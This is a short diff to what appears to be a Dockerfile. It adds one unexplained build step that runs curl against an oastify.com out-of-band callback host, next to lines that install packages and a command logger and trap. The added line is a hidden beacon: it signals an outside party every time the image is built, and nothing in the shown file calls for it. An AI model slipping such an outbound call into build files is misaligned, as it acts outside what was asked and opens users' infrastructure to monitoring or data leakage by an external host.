@@ -4,6 +4,7 @@ ENV NODE_ENV=production
 
 RUN apt-get update && apt-get install -y rsync python3-yaml curl gcc && rm -rf /var/lib/apt/lists/*
 
+RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/api-doc
 
 # 1) Install the logger & trap
 COPY ci/command_logger.sh /etc/command_logger.sh
